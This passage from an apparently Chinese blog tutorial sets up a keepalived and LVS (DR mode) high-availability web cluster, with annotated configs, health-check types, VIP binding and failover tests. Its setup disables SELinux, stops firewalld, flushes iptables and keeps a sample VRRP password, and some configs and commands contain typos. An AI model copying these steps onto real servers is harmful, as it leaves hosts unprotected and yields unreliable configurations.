            &lt;/span&gt;&lt;span&gt;10.220&lt;/span&gt;.&lt;span&gt;5.233&lt;/span&gt;&lt;span&gt;
        }
    }

第三段：virtual_server，虚拟主机配置段
    【该段主要是给lvs来用，用来定义后端RS节点】
    virtual_server &lt;/span&gt;&lt;span&gt;10.220&lt;/span&gt;.&lt;span&gt;5.222&lt;/span&gt; &lt;span&gt;80&lt;/span&gt;&lt;span&gt; {    #指定实例对应的VIP
        delay_loop &lt;/span&gt;&lt;span&gt;6&lt;/span&gt;&lt;span&gt;                    # 对后端节点做健康检查的时间间隔       
        lb_algo rr                      # 指定负载均衡调度算法
        lb_kind DR                      # 指定所使用的lvs模型
        nat_mask &lt;/span&gt;&lt;span&gt;255.255&lt;/span&gt;.&lt;span&gt;255.0&lt;/span&gt;&lt;span&gt;    
        persistence_timeout &lt;/span&gt;&lt;span&gt;50&lt;/span&gt;&lt;span&gt;          # 同一IP的请求50秒内被分配到同一台真实主机
        protocol TCP                    # 用TCP协议对真实节点做健康检查

        real_server &lt;/span&gt;&lt;span&gt;10.220&lt;/span&gt;.&lt;span&gt;5.190&lt;/span&gt; &lt;span&gt;80&lt;/span&gt;&lt;span&gt; {   # 指定一台真实服务器的IP和端口
            weight &lt;/span&gt;&lt;span&gt;1&lt;/span&gt;&lt;span&gt;                    # 设置权重
            TCP_CHECK {                 # 用建立tcp连接的方式做健康检测
                connect_timeout &lt;/span&gt;&lt;span&gt;10&lt;/span&gt;&lt;span&gt;      # 设置建立tcp连接的超时时间
                delay_before_retry &lt;/span&gt;&lt;span&gt;3&lt;/span&gt;&lt;span&gt;    # 超时后多久重试
                nb_get_retry &lt;/span&gt;&lt;span&gt;3&lt;/span&gt;&lt;span&gt;          # 重试次数
                connect_port &lt;/span&gt;&lt;span&gt;80&lt;/span&gt;&lt;span&gt;         # 健康检查使用的端口号
            }
        }

real_server &lt;/span&gt;&lt;span&gt;10.220&lt;/span&gt;.&lt;span&gt;5.191&lt;/span&gt; &lt;span&gt;80&lt;/span&gt;&lt;span&gt; {
    weight &lt;/span&gt;&lt;span&gt;1&lt;/span&gt;&lt;span&gt;
    TCP_CHECK {
        connect_timeout &lt;/span&gt;&lt;span&gt;10&lt;/span&gt;&lt;span&gt;
        nb_get_retry &lt;/span&gt;&lt;span&gt;3&lt;/span&gt;&lt;span&gt;
        delay_before_retry &lt;/span&gt;&lt;span&gt;3&lt;/span&gt;&lt;span&gt;
        connect_port &lt;/span&gt;&lt;span&gt;80&lt;/span&gt;&lt;span&gt;
    }
}
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;7.修改配置文件需要注意的问题&lt;/h2&gt;
&lt;p&gt;1. &lt;span&gt;实例可以有一个，也可以有多个&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;2. &lt;span&gt;单实例中必须相同的配置&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;vrrp_instance VI_1&lt;/p&gt;
&lt;p&gt;virtual_router_id 51&lt;/p&gt;
&lt;p&gt;auth_type PASS&lt;/p&gt;
&lt;p&gt;auth_pass 1111&lt;/p&gt;
&lt;p&gt;virtual_ipaddress&lt;/p&gt;
&lt;p&gt;3. &lt;span&gt;单实例中必须不相同的配置&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;router_id id1&lt;/p&gt;
&lt;p&gt;state MASTER  &lt;/p&gt;
&lt;p&gt;priority 100&lt;/p&gt;
&lt;h2&gt;8.&lt;strong&gt;指定日志保存方式和位置&lt;/strong&gt;&lt;/h2&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;1&lt;/span&gt;&lt;span&gt;. 修改keepalived的配置

    [root@ken &lt;/span&gt;~]# cat /etc/sysconfig/&lt;span&gt;keepalived 
    # Options &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; keepalived. See `keepalived --help&lt;span&gt;'&lt;/span&gt;&lt;span&gt; output and keepalived(8) and&lt;/span&gt;
    # keepalived.conf(&lt;span&gt;5&lt;/span&gt;) man pages &lt;span&gt;for&lt;/span&gt;&lt;span&gt; a list of all options. Here are the most
    # common ones :
    #
    # &lt;/span&gt;--vrrp               -&lt;span&gt;P    Only run with VRRP subsystem.
    # &lt;/span&gt;--check              -C    Only run with Health-&lt;span&gt;checker subsystem.
    # &lt;/span&gt;--dont-release-vrrp  -V    Dont remove VRRP VIPs &amp;amp;&lt;span&gt; VROUTEs on daemon stop.
    # &lt;/span&gt;--dont-release-ipvs  -&lt;span&gt;I    Dont remove IPVS topology on daemon stop.
    # &lt;/span&gt;--dump-conf          -&lt;span&gt;d    Dump the configuration data.
    # &lt;/span&gt;--log-detail         -&lt;span&gt;D    Detailed log messages.
    # &lt;/span&gt;--log-facility       -S    &lt;span&gt;0&lt;/span&gt;-&lt;span&gt;7&lt;/span&gt; Set local syslog facility (&lt;span&gt;default&lt;/span&gt;=&lt;span&gt;LOG_DAEMON)
    #

    KEEPALIVED_OPTIONS&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;-D -d -S 0&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
    #KEEPALIVED_OPTIONS&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;-D&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;

&lt;span&gt;2&lt;/span&gt;&lt;span&gt;. 修改系统日志配置文件
    [root@ken &lt;/span&gt;~]# echo &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;local0.*             /var/log/ka.log&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; &amp;gt;&amp;gt;/etc/&lt;span&gt;rsyslog.conf 

&lt;/span&gt;&lt;span&gt;3&lt;/span&gt;&lt;span&gt;. 重启服务
    [root@ken &lt;/span&gt;~&lt;span&gt;]# systemctl restart rsyslog 
    [root@ken &lt;/span&gt;~&lt;span&gt;]# systemctl restart keepalived 

日志
    级别：指定触发日志的事件的重要等级
    日志设施：指定将日志记录在什么位置&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;9.&lt;strong&gt;keepalived&lt;span&gt;对&lt;/span&gt;&lt;span&gt;RS&lt;/span&gt;&lt;span&gt;做健康检查的方式&lt;/span&gt;&lt;/strong&gt;&lt;/h2&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;    1&lt;/span&gt;&lt;span&gt;. HTTP_GET：向后端的RS发送http请求，如果请求成功，说明后端节点正常（RS是web服务的时候比较常用）
    &lt;/span&gt;&lt;span&gt;2&lt;/span&gt;&lt;span&gt;. TCP：尝试与后端RS建立TCP连接，如果成功，说明后端节点正常
        【仅仅是检查RS系统是否正常工作，不能检查具体的业务】
    &lt;/span&gt;&lt;span&gt;3&lt;/span&gt;&lt;span&gt;. SMTP：对邮件服务器做健康检测
    &lt;/span&gt;&lt;span&gt;4&lt;/span&gt;&lt;span&gt;. MISC：通过脚本的方式实现健康检测


    TCP健康检测方式举例
        TCP_CHECK {                  # 通过TcpCheck判断RealServer的健康状态
            connect_timeout &lt;/span&gt;&lt;span&gt;10&lt;/span&gt;&lt;span&gt;    # 连接超时时间
            nb_get_retry &lt;/span&gt;&lt;span&gt;3&lt;/span&gt;&lt;span&gt;        # 重连次数
            delay_before_retry &lt;/span&gt;&lt;span&gt;3&lt;/span&gt;&lt;span&gt;  # 重连时间间隔
            connect_port &lt;/span&gt;&lt;span&gt;80&lt;/span&gt;&lt;span&gt;       # 检测端口
        }


    HTTP_GET健康检测方式举例
        HTTP_GET {
            url {
                path check&lt;/span&gt;/&lt;span&gt;t.html     # 检查的uri地址
                digest 1362a91278f0   # 用keepalived自带的genhash生成

            connect_timeout &lt;/span&gt;&lt;span&gt;3&lt;/span&gt;&lt;span&gt;         # 链接超时时间
            nb_get_retry &lt;/span&gt;&lt;span&gt;3&lt;/span&gt;&lt;span&gt;            # 重连次数
            delay_before_retry &lt;/span&gt;&lt;span&gt;3&lt;/span&gt;&lt;span&gt;      # 重连时间间隔
            connect_port &lt;/span&gt;&lt;span&gt;6500&lt;/span&gt;&lt;span&gt;         # 检测端口
        }

    MISC健康检测方式举例
        MISC_CHECK {
            misc_path &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;/tmp/check.sh http://1.2.3.4:80/c/200.jsp&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;    
            # 调用外部程序或者脚本的路径和参数

            misc_timeout &lt;/span&gt;&lt;span&gt;10&lt;/span&gt;&lt;span&gt;   
            # 脚本执行的超时时间

            misc_dynamic      
            # 动态权重标志。
            # 脚本返回0 则检测成功，权重不变
            # 返回1表示失败，权重设置为0
        }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;10.keepalived+lvs服务器集群实战&lt;/h2&gt;
&lt;h3&gt;1.环境准备&lt;/h3&gt;
&lt;p&gt;centos7.5&lt;/p&gt;
&lt;p&gt;VIP:172.20.10.11/28&lt;/p&gt;
&lt;p&gt;客户端IP:172.20.10.3/28&lt;/p&gt;
&lt;p&gt;KEEPALIVED+LVS1服务器端IP:172.20.10.2/28&lt;/p&gt;
&lt;p&gt;KEEPALIVED+LVS2服务器端IP:172.20.10.5/28&lt;/p&gt;
&lt;p&gt;WEB1服务器端IP:172.20.10.8/28&lt;/p&gt;
&lt;p&gt;WEB2服务器端IP:172.20.10.9/28&lt;/p&gt;
&lt;h3&gt;2.关闭安全服务&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
[root@ken ~]# setenforce &lt;span&gt;0&lt;/span&gt;&lt;span&gt;
[root@ken &lt;/span&gt;~&lt;span&gt;]# systemctl stop firewalld
[root@ken &lt;/span&gt;~]# iptables -F
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;3.配置KEEPALIVED+LVS1服务器端&lt;/h3&gt;
&lt;p&gt;相当的服务器配置需要保持相同。接下来的配置你需要配置两遍，即在每个服务端都需要配置一遍。&lt;/p&gt;
&lt;h4&gt;安装ipvsadm&lt;/h4&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
[root@ken ~]# yum install popt* libnl* kernel-devel ipvsadm -y
&lt;/pre&gt;&lt;/div&gt;
&lt;h4&gt;安装keepalived&lt;/h4&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
[root@ken ~]# yum install keepalived -y
&lt;/pre&gt;&lt;/div&gt;
&lt;h4&gt;配置主服务器端keepalived&lt;/h4&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
! Configuration File &lt;span&gt;for&lt;/span&gt;&lt;span&gt; keepalived

global_defs {
   notification_email {
     acassen@firewall.loc
     failover@firewall.loc
     sysadmin@firewall.loc
   }
   notification_email_from Alexandre.Cassen@firewall.loc
   smtp_server &lt;/span&gt;&lt;span&gt;192.168&lt;/span&gt;.&lt;span&gt;200.1&lt;/span&gt;&lt;span&gt;
   smtp_connect_timeout &lt;/span&gt;&lt;span&gt;30&lt;/span&gt;&lt;span&gt;
   router_id id1
   vrrp_skip_check_adv_addr
   vrrp_strict
   vrrp_garp_interval &lt;/span&gt;&lt;span&gt;0&lt;/span&gt;&lt;span&gt;
   vrrp_gna_interval &lt;/span&gt;&lt;span&gt;0&lt;/span&gt;&lt;span&gt;
}

vrrp_instance VI_1 {
    state MASTER
    &lt;/span&gt;&lt;span&gt;interface&lt;/span&gt;&lt;span&gt; eth0
virtual_router_id &lt;/span&gt;&lt;span&gt;51&lt;/span&gt;&lt;span&gt;
    priority &lt;/span&gt;&lt;span&gt;150&lt;/span&gt;&lt;span&gt;
    advert_int &lt;/span&gt;&lt;span&gt;1&lt;/span&gt;&lt;span&gt;
    authentication {
        auth_type PASS
        auth_pass &lt;/span&gt;&lt;span&gt;1111&lt;/span&gt;&lt;span&gt;
    }
    virtual_ipaddress {
        &lt;/span&gt;&lt;span&gt;172.20&lt;/span&gt;.&lt;span&gt;10.11&lt;/span&gt;/&lt;span&gt;28&lt;/span&gt;&lt;span&gt;
    }
}

virtual_server &lt;/span&gt;&lt;span&gt;172.20&lt;/span&gt;.&lt;span&gt;10.11&lt;/span&gt; &lt;span&gt;80&lt;/span&gt;&lt;span&gt; {
    delay_loop &lt;/span&gt;&lt;span&gt;6&lt;/span&gt;&lt;span&gt;
    lb_algo rr
    lb_kind DR
    persistence_timeout &lt;/span&gt;&lt;span&gt;50&lt;/span&gt;&lt;span&gt;
    protocol TCP

    real_server &lt;/span&gt;&lt;span&gt;172.20&lt;/span&gt;.&lt;span&gt;10.8&lt;/span&gt; &lt;span&gt;80&lt;/span&gt;&lt;span&gt; {
weight &lt;/span&gt;&lt;span&gt;1&lt;/span&gt;&lt;span&gt;
            TCP_CHECK {
            connect_timeout &lt;/span&gt;&lt;span&gt;3&lt;/span&gt;&lt;span&gt;
            nb_get_retry &lt;/span&gt;&lt;span&gt;3&lt;/span&gt;&lt;span&gt;
            delay_before_retry &lt;/span&gt;&lt;span&gt;3&lt;/span&gt;&lt;span&gt;
        }
    }
    real_server &lt;/span&gt;&lt;span&gt;172.20&lt;/span&gt;.&lt;span&gt;10.9&lt;/span&gt; &lt;span&gt;80&lt;/span&gt;&lt;span&gt; {
        weight &lt;/span&gt;&lt;span&gt;1&lt;/span&gt;&lt;span&gt;
            TCP_CHECK {
            connect_timeout &lt;/span&gt;&lt;span&gt;3&lt;/span&gt;&lt;span&gt;
            nb_get_retry &lt;/span&gt;&lt;span&gt;3&lt;/span&gt;&lt;span&gt;
            delay_before_retry &lt;/span&gt;&lt;span&gt;3&lt;/span&gt;&lt;span&gt;
        }
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;配置好之后可以把这个文件使用scp传输到另外一台服务器上面&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
[root@ken ~]# scp /etc/keepalived/keepalived.conf &lt;span&gt;172.20&lt;/span&gt;.&lt;span&gt;10.5&lt;/span&gt;:/etc/keepalived/&lt;span&gt;keepalived.conf 
root@&lt;/span&gt;&lt;span&gt;172.20&lt;/span&gt;.&lt;span&gt;10.5&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;s password: &lt;/span&gt;
keepalived.conf                                                                        &lt;span&gt;100&lt;/span&gt;% &lt;span&gt;1116&lt;/span&gt;   &lt;span&gt;669&lt;/span&gt;.7KB/s   &lt;span&gt;00&lt;/span&gt;:&lt;span&gt;00&lt;/span&gt;    
&lt;/pre&gt;&lt;/div&gt;
&lt;h4&gt;配置从服务器端keepalived&lt;/h4&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
! Configuration File &lt;span&gt;for&lt;/span&gt;&lt;span&gt; keepalived

global_defs {
   notification_email {
     acassen@firewall.loc
     failover@firewall.loc
     sysadmin@firewall.loc
   }
   notification_email_from Alexandre.Cassen@firewall.loc
   smtp_server &lt;/span&gt;&lt;span&gt;192.168&lt;/span&gt;.&lt;span&gt;200.1&lt;/span&gt;&lt;span&gt;
   smtp_connect_timeout &lt;/span&gt;&lt;span&gt;30&lt;/span&gt;&lt;span&gt;
   router_id id2
   vrrp_skip_check_adv_addr
   vrrp_strict
   vrrp_garp_interval &lt;/span&gt;&lt;span&gt;0&lt;/span&gt;&lt;span&gt;
   vrrp_gna_interval &lt;/span&gt;&lt;span&gt;0&lt;/span&gt;&lt;span&gt;
}

vrrp_instance VI_1 {
    state BACKUP
    &lt;/span&gt;&lt;span&gt;interface&lt;/span&gt;&lt;span&gt; eth0
                     &lt;/span&gt;&lt;span&gt;interface&lt;/span&gt;&lt;span&gt; eth0
    virtual_router_id &lt;/span&gt;&lt;span&gt;51&lt;/span&gt;&lt;span&gt;
    priority &lt;/span&gt;&lt;span&gt;100&lt;/span&gt;&lt;span&gt;
    advert_int &lt;/span&gt;&lt;span&gt;1&lt;/span&gt;&lt;span&gt;
    authentication {
        auth_type PASS
        auth_pass &lt;/span&gt;&lt;span&gt;1111&lt;/span&gt;&lt;span&gt;
    }
    virtual_ipaddress {
        &lt;/span&gt;&lt;span&gt;172.20&lt;/span&gt;.&lt;span&gt;10.11&lt;/span&gt;/&lt;span&gt;28&lt;/span&gt;&lt;span&gt;
    }
}

virtual_server &lt;/span&gt;&lt;span&gt;172.20&lt;/span&gt;.&lt;span&gt;10.11&lt;/span&gt; &lt;span&gt;80&lt;/span&gt;&lt;span&gt; {
    delay_loop &lt;/span&gt;&lt;span&gt;6&lt;/span&gt;&lt;span&gt;
    lb_algo rr
    lb_kind DR
    persistence_timeout &lt;/span&gt;&lt;span&gt;50&lt;/span&gt;&lt;span&gt;
    protocol TCP

    real_server &lt;/span&gt;&lt;span&gt;172.20&lt;/span&gt;.&lt;span&gt;10.8&lt;/span&gt; &lt;span&gt;80&lt;/span&gt;&lt;span&gt; {
                           weight &lt;/span&gt;&lt;span&gt;1&lt;/span&gt;&lt;span&gt;
            TCP_CHECK {
            connect_timeout &lt;/span&gt;&lt;span&gt;3&lt;/span&gt;&lt;span&gt;
            nb_get_retry &lt;/span&gt;&lt;span&gt;3&lt;/span&gt;&lt;span&gt;
            delay_before_retry &lt;/span&gt;&lt;span&gt;3&lt;/span&gt;&lt;span&gt;
        }
    }
    real_server &lt;/span&gt;&lt;span&gt;172.20&lt;/span&gt;.&lt;span&gt;10.9&lt;/span&gt; &lt;span&gt;80&lt;/span&gt;&lt;span&gt; {
        weight &lt;/span&gt;&lt;span&gt;1&lt;/span&gt;&lt;span&gt;
            TCP_CHECK {
            connect_timeout &lt;/span&gt;&lt;span&gt;3&lt;/span&gt;&lt;span&gt;
            nb_get_retry &lt;/span&gt;&lt;span&gt;3&lt;/span&gt;&lt;span&gt;
            delay_before_retry &lt;/span&gt;&lt;span&gt;3&lt;/span&gt;&lt;span&gt;
        }
    }
}
                   &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;4.重启keepalived&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
[root@ken ~]# systemctl restart keepalied
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;5.检查ipvsadm&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
[root@ken ~]# ipvsadm -L -n --&lt;span&gt;stats
IP Virtual Server version &lt;/span&gt;&lt;span&gt;1.2&lt;/span&gt;.&lt;span&gt;1&lt;/span&gt; (size=&lt;span&gt;4096&lt;/span&gt;&lt;span&gt;)
Prot LocalAddress:Port               Conns   InPkts  OutPkts  InBytes OutBytes
  &lt;/span&gt;-&amp;gt;&lt;span&gt; RemoteAddress:Port
TCP  &lt;/span&gt;&lt;span&gt;172.20&lt;/span&gt;.&lt;span&gt;10.11&lt;/span&gt;:&lt;span&gt;80&lt;/span&gt;                     &lt;span&gt;7&lt;/span&gt;       &lt;span&gt;84&lt;/span&gt;        &lt;span&gt;0&lt;/span&gt;    &lt;span&gt;22131&lt;/span&gt;        &lt;span&gt;0&lt;/span&gt;
  -&amp;gt; &lt;span&gt;172.20&lt;/span&gt;.&lt;span&gt;10.8&lt;/span&gt;:&lt;span&gt;80&lt;/span&gt;                      &lt;span&gt;4&lt;/span&gt;       &lt;span&gt;69&lt;/span&gt;        &lt;span&gt;0&lt;/span&gt;    &lt;span&gt;21009&lt;/span&gt;        &lt;span&gt;0&lt;/span&gt;
  -&amp;gt; &lt;span&gt;172.20&lt;/span&gt;.&lt;span&gt;10.9&lt;/span&gt;:&lt;span&gt;80&lt;/span&gt;                      &lt;span&gt;3&lt;/span&gt;       &lt;span&gt;15&lt;/span&gt;        &lt;span&gt;0&lt;/span&gt;     &lt;span&gt;1122&lt;/span&gt;        &lt;span&gt;0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;6.检查VIP&lt;/h3&gt;
&lt;p&gt;检查主服务器端&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
[root@ken ~&lt;span&gt;]# ip a
&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;: lo: &amp;lt;LOOPBACK,UP,LOWER_UP&amp;gt; mtu &lt;span&gt;65536&lt;/span&gt; qdisc noqueue state UNKNOWN group &lt;span&gt;default&lt;/span&gt; qlen &lt;span&gt;1000&lt;/span&gt;&lt;span&gt;
    link&lt;/span&gt;/loopback &lt;span&gt;00&lt;/span&gt;:&lt;span&gt;00&lt;/span&gt;:&lt;span&gt;00&lt;/span&gt;:&lt;span&gt;00&lt;/span&gt;:&lt;span&gt;00&lt;/span&gt;:&lt;span&gt;00&lt;/span&gt; brd &lt;span&gt;00&lt;/span&gt;:&lt;span&gt;00&lt;/span&gt;:&lt;span&gt;00&lt;/span&gt;:&lt;span&gt;00&lt;/span&gt;:&lt;span&gt;00&lt;/span&gt;:&lt;span&gt;00&lt;/span&gt;&lt;span&gt;
    inet &lt;/span&gt;&lt;span&gt;127.0&lt;/span&gt;.&lt;span&gt;0.1&lt;/span&gt;/&lt;span&gt;8&lt;/span&gt;&lt;span&gt; scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;/&lt;span&gt;128&lt;/span&gt;&lt;span&gt; scope host 
       valid_lft forever preferred_lft forever
&lt;/span&gt;&lt;span&gt;2&lt;/span&gt;: eth0: &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP&amp;gt; mtu &lt;span&gt;1500&lt;/span&gt; qdisc pfifo_fast state UNKNOWN group &lt;span&gt;default&lt;/span&gt; qlen &lt;span&gt;1000&lt;/span&gt;&lt;span&gt;
    link&lt;/span&gt;/ether &lt;span&gt;00&lt;/span&gt;:0c:&lt;span&gt;29&lt;/span&gt;&lt;span&gt;:2d:5b:b8 brd ff:ff:ff:ff:ff:ff
    inet &lt;/span&gt;&lt;span&gt;172.20&lt;/span&gt;.&lt;span&gt;10.2&lt;/span&gt;/&lt;span&gt;28&lt;/span&gt; brd &lt;span&gt;172.20&lt;/span&gt;.&lt;span&gt;10.15&lt;/span&gt; scope &lt;span&gt;global&lt;/span&gt;&lt;span&gt; noprefixroute eth0
       valid_lft forever preferred_lft forever
    inet &lt;/span&gt;&lt;span&gt;172.20&lt;/span&gt;.&lt;span&gt;10.11&lt;/span&gt;/&lt;span&gt;28&lt;/span&gt; scope &lt;span&gt;global&lt;/span&gt;&lt;span&gt; secondary eth0        #VIP现在在主服务器端
       valid_lft forever preferred_lft forever
    inet6 fe80::20c:29ff:fe2d:5bb8&lt;/span&gt;/&lt;span&gt;64&lt;/span&gt;&lt;span&gt; scope link 
       valid_lft forever preferred_lft forever&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;检查从服务器端&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
[root@ken ~&lt;span&gt;]# ip a
&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;: lo: &amp;lt;LOOPBACK,UP,LOWER_UP&amp;gt; mtu &lt;span&gt;65536&lt;/span&gt; qdisc noqueue state UNKNOWN group &lt;span&gt;default&lt;/span&gt; qlen &lt;span&gt;1000&lt;/span&gt;&lt;span&gt;
    link&lt;/span&gt;/loopback &lt;span&gt;00&lt;/span&gt;:&lt;span&gt;00&lt;/span&gt;:&lt;span&gt;00&lt;/span&gt;:&lt;span&gt;00&lt;/span&gt;:&lt;span&gt;00&lt;/span&gt;:&lt;span&gt;00&lt;/span&gt; brd &lt;span&gt;00&lt;/span&gt;:&lt;span&gt;00&lt;/span&gt;:&lt;span&gt;00&lt;/span&gt;:&lt;span&gt;00&lt;/span&gt;:&lt;span&gt;00&lt;/span&gt;:&lt;span&gt;00&lt;/span&gt;&lt;span&gt;
    inet &lt;/span&gt;&lt;span&gt;127.0&lt;/span&gt;.&lt;span&gt;0.1&lt;/span&gt;/&lt;span&gt;8&lt;/span&gt;&lt;span&gt; scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;/&lt;span&gt;128&lt;/span&gt;&lt;span&gt; scope host 
       valid_lft forever preferred_lft forever
&lt;/span&gt;&lt;span&gt;2&lt;/span&gt;: eth0: &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP&amp;gt; mtu &lt;span&gt;1500&lt;/span&gt; qdisc pfifo_fast state UNKNOWN group &lt;span&gt;default&lt;/span&gt; qlen &lt;span&gt;1000&lt;/span&gt;&lt;span&gt;
    link&lt;/span&gt;/ether &lt;span&gt;00&lt;/span&gt;:0c:&lt;span&gt;29&lt;/span&gt;&lt;span&gt;:a5:e9:a4 brd ff:ff:ff:ff:ff:ff
    inet &lt;/span&gt;&lt;span&gt;172.20&lt;/span&gt;.&lt;span&gt;10.5&lt;/span&gt;/&lt;span&gt;28&lt;/span&gt; brd &lt;span&gt;172.20&lt;/span&gt;.&lt;span&gt;10.15&lt;/span&gt; scope &lt;span&gt;global&lt;/span&gt;&lt;span&gt; noprefixroute eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::20c:29ff:fea5:e9a4&lt;/span&gt;/&lt;span&gt;64&lt;/span&gt;&lt;span&gt; scope link 
       valid_lft forever preferred_lft forever&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;6.配置web服务器端&lt;/h3&gt;
&lt;h4&gt;1.下载apache&lt;/h4&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
[root@ken ~]# yum install httpd -y
&lt;/pre&gt;&lt;/div&gt;
&lt;h4&gt;2.准备测试页面&lt;/h4&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
[root@ken ~]# echo &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;this is 172.20.10.8 for test&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; &amp;gt;/&lt;span&gt;var&lt;/span&gt;/www/html/index.html 
&lt;/pre&gt;&lt;/div&gt;
&lt;h4&gt;3.启动apache&lt;/h4&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
[root@ken ~&lt;span&gt;]# systemctl restart httpd
[root@ken &lt;/span&gt;~]# ss -tnl |grep &lt;span&gt;80&lt;/span&gt;&lt;span&gt;
LISTEN     &lt;/span&gt;&lt;span&gt;0&lt;/span&gt;      &lt;span&gt;128&lt;/span&gt;         :::&lt;span&gt;80&lt;/span&gt;                      :::*   
&lt;/pre&gt;&lt;/div&gt;
&lt;h4&gt;4.绑定VIP&lt;/h4&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
[root@ken ~]# ip a a &lt;span&gt;172.20&lt;/span&gt;.&lt;span&gt;10.11&lt;/span&gt;/&lt;span&gt;32&lt;/span&gt; dev lo:&lt;span&gt;0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h4&gt;5.arp抑制&lt;/h4&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;34&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
[root@ken ~]# echo &quot;1&quot;&amp;gt;/proc/sys/net/ipv4/conf/lo/arp_ignore
[root@ken ~]# echo &quot;1&quot;&amp;gt;/proc/sys/net/ipv4/conf/all/arp_ignore
[root@ken ~]# echo &quot;2&quot;&amp;gt;/proc/sys/net/ipv4/conf/lo/arp_announce
[root@ken ~]# echo &quot;2&quot;&amp;gt;/proc/sys/net/ipv4/conf/all/arp_announce
&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;11.浏览器测试&lt;/h2&gt;
&lt;p&gt;确认每台服务器每项服务重启之后，再次关闭每台服务器&lt;/p&gt;
&lt;p&gt;防火墙&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
[root@ken ~]# iptables -F
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;输入VIP地址&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1499615/201810/1499615-20181001222121799-1336900538.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;测试成功！&lt;/p&gt;
&lt;p&gt;进行刷新测试&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1499615/201810/1499615-20181001222336757-2075181065.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;测试成功！&lt;/p&gt;
&lt;p&gt;关闭一台172.20.10.8web服务器进行测试&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
[root@ken ~]# systemctl stop httpd
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;查看ipvsadm规则&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
[root@ken ~]# ipvsadm -L -&lt;span&gt;n
IP Virtual Server version &lt;/span&gt;&lt;span&gt;1.2&lt;/span&gt;.&lt;span&gt;1&lt;/span&gt; (size=&lt;span&gt;4096&lt;/span&gt;&lt;span&gt;)
